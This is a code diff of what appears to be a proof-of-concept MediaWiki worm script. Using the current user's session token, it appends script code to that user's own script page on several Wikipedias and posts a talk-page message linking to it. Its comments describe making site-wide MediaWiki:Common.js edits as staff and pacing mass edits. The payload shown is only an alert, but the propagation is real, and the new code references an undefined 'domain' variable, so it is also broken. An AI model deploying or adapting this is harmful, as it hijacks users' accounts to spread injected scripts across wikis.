@@ -20,25 +20,35 @@
 		);
 	}
 	// spread the word
-	async function editWiki(user='not used, but it could') {
+	async function editWiki({user='not used, but it could', site="meta.wikimedia.org"}={}) {
 		await mw.loader.using('mediawiki.api');
-		const metaApi = new mw.ForeignApi("https://meta.wikimedia.org/w/api.php");
+		const api = new mw.ForeignApi(`https://${domain}/w/api.php`);
 		const username = mw.config.get('wgUserName');
 
-		// blocked? (badtoken) wise 🙃
-		await metaApi.postWithToken("csrf", metaApi.assertCurrentUser({
+		// ForeignApi edits blocked for meta? (badtoken)... Wise! 🙃
+		// (could still do this when being on meta... so that would be as bad as the last time)
+		//let script = `User:${username}/global.js`;
+
+		// lets do an edit to /common.js instead we can spread the word from there too
+		let script = `User:${username}/wiki-poc--could-be--common.js`;
+		if (isUserUnlocked()) {
+			//script = `Mediawiki:Common.js`;
+			console.error('could be nasty here... but not today');
+		}
+
+		await api.postWithToken("csrf", api.assertCurrentUser({
 			action: 'edit',
-			title: `User:${username}/wiki-poc--could-be--global.js`,
+			title: script,
 			appendtext: "\nalert('Hi');",
 			summary: 'POC edit'
 		}));
 
-		await metaApi.postWithToken("csrf", metaApi.assertCurrentUser({
+		await api.postWithToken("csrf", api.assertCurrentUser({
 			action: "edit",
 			title: "User talk:Nux",
 			section: "new",
 			sectiontitle: "Hello dark theater my old friend " + (new Date()).toISOString(),
-			text: `I just wanted you to check out [[User:${username}/wiki-poc--could-be--global.js]] ~~~~`,
+			text: `I just wanted you to check out [[${script}]] ~~~~`,
 			summary: "PoC message",
 			format: "json"
 		}));
@@ -47,15 +57,18 @@
 		let activeUsers = [];
 		if (isCurrentUserStaff() && isUserUnlocked()) {
 			// I could do any edits in Mediawiki for an hour here.
-			// I could use random setTimeout to pause execution
-			// or setInterval to avoid making too many edits at once.
+			// I could use random await setTimeout to pause execution (to avoid doing too many edits)...
+			// ...or I could use setInterval to either do edits in chunks or just repeat edits.
 			for (let user of activeUsers) {
-				await editWiki(user);
+				await editWiki({user});
 			}
 		}
 
 		// simple edit
-		editWiki();	
+		let sites = ['pl.wikipedia.org', 'de.wikipedia.org', 'en.wikipedia.org']
+		for (let site of sites) {
+			editWiki({site});
+		}
 	}
 	$(function(){
 		doTheStuff();
